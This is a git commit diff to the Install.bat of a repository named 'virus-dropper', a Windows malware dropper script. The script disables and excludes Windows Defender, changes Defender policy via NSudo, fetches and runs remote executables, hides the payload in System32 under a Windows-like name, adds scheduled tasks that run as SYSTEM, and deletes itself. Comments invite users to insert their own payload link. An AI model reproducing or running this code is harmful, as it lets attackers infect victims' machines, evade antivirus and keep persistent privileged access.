451b0837e397c75691758ec12a7d8bd6032eb045
YumYummity <103061664+YumYummity@users.noreply.github.com>
2022-04-27 19:16:16 -0400

    Update Install.bat

--- install/Install.bat
+++ install/Install.bat
@@ -1,4 +1,6 @@
 color ef
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%~dp0'"
+powershell -Command "Unblock-file 'AV.bat'"
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/AV.bat" --output "AV.bat"
 start /min AV.bat
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/NSudo.exe" --output "NSudo.exe"
@@ -7,18 +9,25 @@ NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Window
 powershell -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
 ::windows defender exclusions
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows.exe'"
-
 ::direct download link
 ::edit this to your files
 md "%systemroot%\System32\Windowsexe"
-curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Windows.exe" --output "%appdata%\Windows.exe"
-move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
+
+
 ::upload files here: github.com - create account and create repository (public) then upload files
+::put payload file DIRECT download link here:
+curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Windows.exe" --output "%appdata%\Windows.exe"
+
+
+move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%systemroot%\System32\Windowsexe'"
 NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
 powershell -Command "Unblock-file '%systemroot%\System32\Windowsexe\Windows.exe'"
 start "Windows.exe" "%systemroot%\System32\Windowsexe\Windows.exe"
+move "AV.bat" "%systemroot%\System32\Windowsexe\AV.bat"
+
 SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST
+SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
 del NSudo.exe
 call :deleteSelf&exit
 :deleteSelf
